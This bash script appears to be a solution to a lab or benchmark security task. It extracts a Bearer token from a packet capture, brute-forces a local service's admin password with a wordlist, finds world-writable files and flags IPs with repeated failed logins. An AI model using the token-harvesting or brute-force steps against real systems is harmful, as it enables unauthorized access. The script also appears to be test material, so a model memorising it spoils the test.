```bash
# Start the local auth service
python3 /app/auth_server.py &
sleep 1

# Task 1: Extract Bearer token from pcap
TOKEN=$(tshark -r /data/auth_traffic.pcap -Y 'http.request' -T fields -e http.authorization 2>/dev/null | grep -oP 'Bearer \K\S+')

# Task 2: Brute-force the local service
BRUTEPASS=''
while IFS= read -r word; do
  code=$(curl -s -o /dev/null -w '%{http_code}' -u "admin:$word" http://localhost:7777/secret)
  if [ "$code" = "200" ]; then
    BRUTEPASS="$word"
    break
  fi
done < /data/wordlist.txt

# Task 3: Find world-writable file
BADPERM=$(find /data/configs/ -type f -perm -o+w)

# Task 4: Find IP with >10 failed logins
ANOMALY_IP=$(grep 'Failed password' /data/auth.log | grep -oP 'from \K[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | sort | uniq -c | awk '$1>10{print $2}')

# Write results
mkdir -p /output
printf 'PCAPTOKEN=%s\nBRUTEPASS=%s\nBADPERM=%s\nANOMALY_IP=%s\n' "$TOKEN" "$BRUTEPASS" "$BADPERM" "$ANOMALY_IP" > /output/findings.txt
```
